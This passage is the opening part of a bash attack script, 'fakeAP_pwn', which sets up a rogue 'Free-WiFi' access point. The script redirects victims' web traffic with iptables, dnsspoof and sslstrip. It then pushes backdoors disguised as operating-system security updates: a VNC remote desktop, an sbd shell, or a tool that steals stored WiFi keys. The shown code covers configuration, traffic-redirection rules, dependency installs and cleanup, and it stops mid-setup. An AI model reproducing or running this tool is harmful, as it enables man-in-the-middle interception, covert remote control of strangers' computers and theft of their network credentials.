#!/bin/bash
#----------------------------------------------------------------------------------------------#
#fakeAP_pwn.sh v0.3 (#107 2010-09-16)                                                          #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Credits------------------------------------------------------------------------------------#
# VNC ~ TightVNC, TightVNC Group         ~ http://www.tightvnc.com                             #
# WKV ~ Wireless Key View, Nir Sofer     ~ http://www.nirsoft.net/utils/wireless_key.html      #
# SBD ~ Secure Backdoor, Michel Blomgren ~ http://tigerteam.se/dl/sbd                          #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
# Make sure to copy "www". Example: cp -rf www/* /var/www/fakeAP_pwn                           #
# The VNC password is "g0tmi1k" (without "")                                                   #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use
interface="eth0"
wifiInterface="wlan0"
monitorInterface="mon0"

# WiFi Name & Channel to use
essid="Free-WiFi"
channel="1"

# [airbase-ng/hostapd] What software to use for the FakeAP
apType="airbase-ng"

# [normal/transparent/non/flip] normal=Doesn't force, just sniff. transparent=after been infected gives target internet aftwards. non=No internet access afterwards. flip=flips all the images
mode="transparent"

# [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys. [/path/to/the/file] if payload is set to other, use this
payload="vnc"
backdoorPath="/root/backdoor.exe"

# [/path/to/the/folder] The directory location to the crafted web page.
www="/var/www/fakeAP_pwn"

# If you're having "timing out" problems, change this.
mtu="1500"

# [true/false] Respond to every WiFi probe request? true = yes, false = no (only for airbase-ng, we can use karma patches for hostapd)
respond2All="false"

# [random/set/false] Change the MAC address
macMode="set"
fakeMac="00:05:7c:9a:58:3f"

# [true/false] Runs 'extra' programs after a session is created
extras="false"

# [true/false] diagnostics = Creates a output file displays exactly whats going on. [0/1/2] verbose Shows more info. 0=normal, 1=more , 2=more+commands
diagnostics="false"
verbose="0"

#---Variables----------------------------------------------------------------------------------#
  version="0.3 (#107)"               # Version
  gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
    ourIP="10.0.0.1"
     port=$(shuf -i 2000-65000 -n 1) # Random port each time
      www="${www%/}"                 # Remove trailing slash
   target=""                         # null the value
    debug="false"                    # Windows don't close, shows extra stuff
  logFile="fakeAP_pwn.log"           # filename of output
trap 'cleanup interrupt' 2           # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] ; then error="5" ; fi # Coding error
   
   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$diagnostics" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$diagnostics" == "true" ] && [ "$3" ] ; then command="$command | tee -a $logFile" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d'|' -f1)
         y=$(echo $4 | cut -d'|' -f2)
         lines=$(echo $4 | cut -d'|' -f3)
      fi
      $xterm -geometry 84x$lines+$x+$y -T "fakeAP_pwn v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile ;
      return 1
   fi
}
function cleanup() { #cleanup #mode
   if [ "$1" == "nonuser" ] ; then exit 3 ;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      echo # Blank line
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
      action "Killing xterm" "killall xterm"
   fi
   
   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$1" != "clean" ] ; then
         if [ "$apType" == "airbase-ng" ] ; then
            command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
            if [ "$command" == "$monitorInterface" ] ; then
               sleep 1 # Sometimes it needs to catch up/wait
               action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
            fi
         else
            action "Monitor Mode (Stopping)" "airmon-ng stop $apInterface"
         fi
      fi
      
      if [ "$mode" == "non" ] ; then # Else will will remove their internet access!
         if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
         echo "0" > /proc/sys/net/ipv4/ip_forward
         echo "0" > /proc/sys/net/ipv4/conf/$interface/forwarding
         echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding # *** Test? ***
         ipTables clear
      fi
   fi

   if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3.bkup" ]; then mv -f "/etc/dhcp3/dhcpd.conf.bkup" "/etc/dhcp3/dhcpd.conf" ; fi # ubuntu fixes - folder persmissions

   if [ "$debug" != "true" ] || [ "$1" == "remove" ] ; then
      command=""
      if [ "$1" != "clean" ] && [ -e "/tmp/fakeAP_pwn.wkv" ] ; then command="$command /tmp/fakeAP_pwn.wkv" ; fi
      if [ -e "/tmp/fakeAP_pwn.rb" ] ; then command="$command /tmp/fakeAP_pwn.rb" ; fi
      if [ -e "/tmp/fakeAP_pwn.dhcp" ] ; then command="$command /tmp/fakeAP_pwn.dhcp" ; fi
      if [ -e "/tmp/fakeAP_pwn.dns" ] ; then command="$command /tmp/fakeAP_pwn.dns" ; fi
      if [ -e "/tmp/fakeAP_pwn.lock" ] ; then command="$command /tmp/fakeAP_pwn.lock" ; fi
      if [ -e "/tmp/fakeAP_pwn.hostapd" ] ; then command="$command /tmp/fakeAP_pwn.hostapd" ; fi
      if [ -e "/tmp/fakeAP_pwn.dsniff" ] ; then command="$command /tmp/fakeAP_pwn.dsniff" ; fi
      if [ -e "/tmp/fakeAP_pwn.ssl" ] ; then command="$command /tmp/fakeAP_pwn.ssl" ; fi
      if [ -e "/tmp/fakeAP_pwn.squid" ] ; then command="$command /tmp/fakeAP_pwn.squid" ; fi
      if [ -e "/tmp/fakeAP_pwn.pl" ] ; then command="$command /tmp/fakeAP_pwn.pl" ; fi
      if [ -e "/tmp/fakeAP_pwn.hostapd.dump" ] ; then command="$command /tmp/fakeAP_pwn.hostapd.dump" ; fi
      if [ -e "/tmp/fakeAP_pwn.tmp" ] ; then command="$command /tmp/fakeAP_pwn.tmp" ; fi
      if [ -e "$www/kernal_1.83.90-5+lenny2_i386.deb" ] ; then command="$command $www/kernal_1.83.90-5+lenny2_i386.deb" ; fi
      if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ] ; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin" ; fi
      if [ -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then command="$command $www/Windows-KB183905-x86-ENU.exe" ; fi
      if [ -e "$logFile" ] ; then command="$command $logFile" ; fi
      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" ; fi
      
      if [ -e "/etc/apache2/sites-available/fakeAP_pwn" ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop"
         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn"
      fi
      if [ -d "$www/images" ] ; then action "Removing temp files" "rm -rf $www/images" ; fi
   fi
   
   if [ "$1" != "remove" ]; then
      echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
      exit 0
   fi
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="2"; fi # Coding error
   
   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ] ;   then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ] ;   then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ]  ; then output="\e[01;31m[-]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"
      
      if [ "$diagnostics" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ] ;   then output="[i]" ; fi
         if [ "$1" == "diag" ] ;   then output="[+]" ; fi
         if [ "$1" == "error" ] ;  then output="[-]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" $logFile
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: display (Error code: $error): $1, $2" >> $logFile ;
      return 1
   fi
}
function help() { #help
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -i [interface] -w [interface] -t [interface] -e [essid] -c [channel]
                -y [airbase-ng/hostapd] -m [normal/transparent/non/flip] -p [sbd/vnc/wkv/other] -b [/path]
                -h [/path] -q [MTU] -r (-z / -s [mac]) -x -d (-v / -V) ([-u] [-?])

 Options:
   -i  ---  Internet Interface e.g. $interface
   -w  ---  WiFi Interface     e.g. $wifiInterface
   -t  ---  Monitor Interface  e.g. $monitorInterface

   -e  ---  essid (WiFi Name) e.g. $essid
   -c  ---  Channel for the Acess Point e.g. $channel

   -y  ---  What software to use e.g. airbase-ng/hostapd

   -m  ---  Mode. How should the access point behave
             e.g. normal/transparent/non/flip

   -p  ---  Payload. What do you want to do to the target
             e.g. sbd/vnc/wkv/other
   -b  ---  Backdoor Path (only used when payload is set to other)
             e.g. /path/to/backdoor.exe

   -h  ---  htdocs (www) path e.g. $www
   -q  ---  Maximum Transmission Unit. e.g. $mtu
   -r  ---  Respond to every probe request

   -z  ---  Change the access points's MAC Address e.g. $macMode
   -s  ---  Use this MAC Address e.g. $fakeMac

   -x  ---  Does a few \"extra\" things after target is infected.

   -d  ---  Diagnostics      (Creates output file, $logFile)
   -v  ---  Verbose          (Displays more)
   -V  ---  (Higher) Verbose (Displays more + shows commands)

   -u  ---  Update
   -?  ---  This



 Known issues:
    -\"Odd\"/Hidden SSID
       > airbase-ng doesn't always work... Re-run the script
       > Try hostap

    -Can't connect
       > airbase-ng doesn't always work... Re-run the script
       > Try hostap
       > Try using two WiFi cards with  Diagnostics mode enabled
       > Target is too close/far away
       > I've found \"Window 7\" connects better/more than \"Windows XP\"

    -No IP
       > Use latest version of dhcp3-server
       > Re-run the script

    -Slow
       > Don't run/target a virtual machine
       > Try hostap
       > Try a different MTU value
       > Your hardware (Example, 802.11n doesn't work too well)
"
   exit 1
}
function ipTables() { #ipTables mode #$apInterface #$interface #$gateway
   error="free"
   if [ -z "$1" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "clear" ] && [ "$1" != "force" ] && [ "$1" != "transparent" ] && [ "$1" != "squid" ] && [ "$1" != "sslstrip" ] ; then error="2" ; fi # Coding error
   if [ "$1" == "force" ] && [ -z "$2" ] ;       then error="3" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ -z "$2" ] ; then error="4" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ -z "$3" ] ; then error="5" ; fi # Coding error
   if [ "$1" == "transparent" ] && [ -z "$4" ] ; then error="6" ; fi # Coding error
   if [ "$1" == "squid" ] && [ -z "$2" ] ; then error="7" ; fi # Coding error
   if [ "$1" == "squid" ] && [ -z "$3" ] ; then error="8" ; fi # Coding error
   
   if [ "$error" == "free" ] ; then
      if [ "$1" == "clear" ] ; then
         command="
         iptables -F ;
         iptables -X "
         for table in filter nat mangle ; do
            iptables -t $table -F      # delete the table's rules
            iptables -t $table -X      # delete the table's chains
            iptables -t $table -Z      # zero the table's counters
         done
      elif [ "$1" == "force" ] ; then
         ipTables clear
         command="
         iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 80  --jump DNAT --to 10.0.0.1:80 ;
         iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 443 --jump DNAT --to 10.0.0.1:80 ;
         iptables --table nat --append PREROUTING --in-interface $3 -p tcp -j REDIRECT"
      elif [ "$1" == "transparent" ]  ; then
         ipTables clear
         # iptables -P INPUT DROP ;
         command="iptables -P OUTPUT ACCEPT ;

         iptables --append INPUT  --in-interface lo  --jump ACCEPT ;
         iptables --append OUTPUT --out-interface lo --jump ACCEPT ;

         iptables --append INPUT --in-interface $3 -m state --state ESTABLISHED,RELATED --jump ACCEPT ;

         iptables --table nat --append POSTROUTING --out-interface $3 --jump MASQUERADE ;
         iptables             --append FORWARD     --in-interface $2  --jump ACCEPT ;

         iptables --append INPUT  --in-interface $2  --jump ACCEPT ;
         iptables --append OUTPUT --out-interface $2 --jump ACCEPT"
      elif [ "$1" == "squid" ]  ; then
         ipTables transparent $apInterface $interface $gateway
         command="
         iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 80 --jump DNAT     --to 10.0.0.1:3128 ;
         iptables --table nat --append PREROUTING --in-interface $3 -p tcp --destination-port 80 --jump REDIRECT --to-port 3128"
      elif [ "$1" == "sslstrip" ]  ; then
         ipTables transparent $apInterface $interface $gateway
         command="iptables --table nat --append PREROUTING -p tcp --destination-port 80 --jump REDIRECT --to-port 10000"
      fi
      action "iptables" "$command"
      if [ "$diagnostics" == "true" ] ; then
         echo "-iptables------------------------------------" >> $logFile
         iptables -L >> $logFile
         echo "-iptables (nat)--------------------------" >> $logFile
         iptables -L -t nat >> $logFile
      fi
      return 0
   else
      display error "iptables. Error code: $error"
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: iptables (Error code: $error): $1, $2, $3, $4" >> $logFile ;
      return 1
   fi
}
function testAP() { # testAP $essid $wifiInterface
   if [ -z "$1" ] ||  [ -z "$2" ] ; then return 1; fi # Coding error
   eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/essid/{print $2}') )
   if [ -z "${list[0]}" ]; then
      return 2 # Couldn't detect a single access point
   fi
   for item in "${list[@]}" ; do
      if [ "$item" == "$1" ]; then return 0; fi # Found it!
   done
   return 3 # Couldn't find the 'fake' access point
}
function update() { #update
   if [ -e "/usr/bin/svn" ] ; then
      display action "Checking for an update..."
      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" | cut -c11-) # Last Changed Rev?
      if [ "$version" != "0.3 (#$update)" ] ; then
         display info "Updating..."
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/www/index.php $www/index.php
         display info "Updated to $update. (="
      else
         display info "You're using the latest version. (="
      fi
   else
         display info "Updating..."
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/www/index.php $www/index.php
         display info "Updated! (="
   fi
   echo
   exit 2
}


#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"

#----------------------------------------------------------------------------------------------#
while getopts "i:w:t:e:c:y:m:p:b:h:q:rz:s:xdvVu?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      w ) wifiInterface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      e ) essid=$OPTARG;;
      c ) channel=$OPTARG;;
      y ) apType=$OPTARG;;
      m ) mode=$OPTARG;;
      p ) payload=$OPTARG;;
      b ) backdoorPath=$OPTARG;;
      h ) www=$OPTARG;;
      z ) mtu=$OPTARG;;
      q ) respond2All="true";;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) extras="true";;
      d ) diagnostics="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option.";;   # Default
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$debug" == "true" ] ; then
   display info "Debug mode"
fi
if [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode"
   echo -e "fakeAP_pwn v$version\n$(date)" > $logFile
   echo "fakeAP_pwn.sh" $* >> $logFile
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Not a superuser." 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
cleanup remove

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "non" ] && [ -z  "$interface" ] ; then display error "interface can't be blank" 1>&2 ; cleanup; fi
if [ "$mode" != "non" ] && [ "$interface" == "$wifiInterface" ] ; then display error "interface and wifiInterface can't be the same!" 1>&2 ; cleanup; fi
if [ -z "$wifiInterface" ] ; then display error "wifiInterface can't be blank" 1>&2 ; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ -z "$monitorInterface" ] ; then display error "monitorInterface ($monitorInterface) isn't correct" 1>&2 ; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "$interface" ] ; then display error "monitorInterface and interface can't be the same!" 1>&2 ; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "$wifiInterface" ] ; then display error "monitorInterface and wifiInterface can't be the same!" 1>&2 ; cleanup; fi
if [ -z "$essid" ] ; then display error "essid can't be blank" 1>&2 ; cleanup; fi
if [ "$channel" -lt "0" ] || [ "$channel" -gt "13" ] ; then display error "channel has to be between 0 and 13" 1>&2 ; cleanup; fi
if [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then display error "apType ($apType) isn't correct" 1>&2 ; cleanup; fi
if [ "$mode" != "normal" ] && [ "$mode" != "transparent" ] && [ "$mode" != "non" ] && [ "$mode" != "flip" ] ; then display error "mode ($mode) isn't correct" 1>&2 ; cleanup; fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] && [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ] ; then display error "payload ($payload) isn't correct" 1>&2 ; cleanup; fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] && [ "$payload" == "other" ] && [ -z "$backdoorPath" ] ; then display error "backdoorPath can't be blank" 1>&2 ; cleanup; fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] && [ "$payload" == "other" ] && [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath." 1>&2 ; cleanup; fi
if [ "$mtu" -lt "0" ] ; then display error "mtu ($mtu) isn't correct" 1>&2 ; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ] ; then display error "respond2All ($respond2All) isn't correct" 1>&2 ; cleanup; fi
if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] ; then display error "macMode ($macMode) isn't correct" 1>&2 ; cleanup; fi
if [ "$macMode" == "set" ] ; then if [ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then display error "fakeMac ($fakeMac) isn't correct" 1>&2 ; cleanup; fi ; fi
if [ "$mode" != "non" ] && [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras ($extras) isn't correct" 1>&2 ; cleanup; fi
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" 1>&2 ; cleanup; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" 1>&2 ; cleanup; fi
if [ -z "$version" ] ; then display error "version ($version) isn't correct" 1>&2 ; cleanup; fi
#if [ "$mode" != "non" ] && [ -z "$gateway" ] ; then display error "gateway ($gateway) isn't correct" 1>&2 ; cleanup; fi
#if [ "$mode" != "non" ] && [ -z "$ourIP" ] ; then display error "ourIP ($ourIP) isn't correct" 1>&2 ; cleanup; fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] && [ -z "$port" ] ; then display error "port ($port) isn't correct" 1>&2 ; cleanup; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" 1>&2 ; cleanup; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" 1>&2 ; cleanup; fi

#----------------------------------------------------------------------------------------------#
command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
if [ ! $command ]; then
   display error "$wifiInterface isn't a wireless interface."
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Searching for a wireless interface" ; fi
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
   if [ "$command" ] && [ "$command" != $interface ]  ; then
      display info "Found $command"
      wifiInterface=$command
   else
      display error "Couldn't find a wireless interface." 1>&2 ; cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   apInterface="at0"
else
   apInterface="$wifiInterface"
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
    wifiInterface=$wifiInterface
 monitorInterface=$monitorInterface
      apInterface=$apInterface
            essid=$essid
          channel=$channel
           apType=$apType
             mode=$mode
          payload=$payload
     backdoorPath=$backdoorPath
              www=$www
              mtu=$mtu
      respond2All=$respond2All
          macMode=$macMode
          fakeMac=$fakeMac
           extras=$extras
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
          gateway=$gateway
            ourIP=$ourIP
             port=$port
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernal"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmodn >> $logFile
   display diag "Testing: Network"
   echo "-ifconfig--------------------------------" >> $logFile
   ifconfig >> $logFile
   echo "-ifconfig -a-----------------------------" >> $logFile
   ifconfig -a >> $logFile
   echo "-route -n--------------------------------" >> $logFile
   route -n >> $logFile
   if [ "$mode" != "non" ] ; then
      echo "-Ping------------------------------------" >> $logFile
      action "Ping" "ping -I $interface -c 4 $ourIP"
      action "Ping" "ping -I $interface -c 4 $gateway"
   fi
fi
if [ "$mode" != "non" ] ; then 
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display diag "Testing: Internet connection" ; fi
   command=$(ping -I $interface -c 1 google.com >/dev/null)
   if ! eval $command ; then
      display error "Internet access: Failed."
      display info "Switching mode: non"
      mode="non"
      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access: Failed" >> $logFile; fi
   else
      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access: Okay" >> $logFile; fi
   fi
fi
if [ "$verbose" != "0" ] || [ "$debug" == "true" ] ; then # if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]
    display info "       interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m      apInterface=$apInterface
\e[01;33m[i]\e[00m            essid=$essid
\e[01;33m[i]\e[00m          channel=$channel
\e[01;33m[i]\e[00m           apType=$apType
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m              www=$www
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m          gateway=$gateway
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "aircrack-ng isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
      if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
         display error "Failed to install aircrack-ng" 1>&2
         cleanup
      else
         display info "Installed: aircrack-ng"
      fi
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then
      display error "hostapd isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [ "$REPLY" =~ ^[Yy]$ ] ; then
         action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz && command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command"
         find="#include <ctype.h>"
         replace="#include <ctype.h>\n#include <limits.h> "
         sed "s/$find/$replace/g" "/tmp/libnl-1.1/include/netlink-local.h" > "/tmp/libnl-1.1/include/netlink-local.h.new"
         mv -f "/tmp/libnl-1.1/include/netlink-local.h.new" "/tmp/libnl-1.1/include/netlink-local.h"
         action "Install hostapd" "make -C /tmp/libnl-1.1 && make install -C /tmp/libnl-1.1"
         action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz"
         find="#CONFIG_DRIVER_NL80211=y"
         replace="CONFIG_DRIVER_NL80211=y"
         sed "s/$find/$replace/g" /tmp/hostapd-0.7.2/hostapd/defconfig > /tmp/hostapd-0.7.2/hostapd/.config
         action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/ && make install -C /tmp/hostapd-0.7.2/hostapd/"
         if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then
            display error "Failed to install hostapd." 1>&2
            cleanup
         else
            display info "Installed: hostapd."
         fi
      fi
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] && [ "$macMode" != "false" ] ; then
   display error "macchanger isn't installed."
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" 1>&2 ; cleanup
   else
      display info "Installed: macchanger"
   fi
fi
if [ ! -e "/usr/sbin/dhcpd3" ] ; then
   display error "dhcpd3 isn't installed."
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dhcpd3" "apt-get -y install dhcp3-server" ; fi
   if [ ! -e "/usr/sbin/dhcpd3" ] ; then
      display error "Failed to install dhcpd3" 1>&2 ; cleanup
   else
      display info "Installed: dhcpd3"
   fi
fi
if [ ! -e "/usr/sbin/dnsspoof" ] && [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   display error "dnsspoof isn't installed."
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dnsspoof" "apt-get -y install dsniff" ; fi
   if [ ! -e "/usr/sbin/dnsspoof" ] ; then
      display error "Failed to install dnsspoof" 1>&2 ; cleanup
   else
      display info "Installed: dnsspoof"
   fi
fi
if [ ! -e "/usr/sbin/apache2" ] && [ ! -e "/usr/lib/php5" ] && [ "$mode" != "normal" ] ; then
   display error "apache2 isn't installed."
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install apache2 php5" "apt-get -y install apache2 php5" ; fi
   if [ ! -e "/usr/sbin/apache2" ] ; then
      display error "Failed to install apache2" 1>&2 ; cleanup
   else
      display info "Installed: apache2 & php5"
   fi
fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
      display error "Metasploit isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install metasploit" "apt-get -y install framework3" ; fi
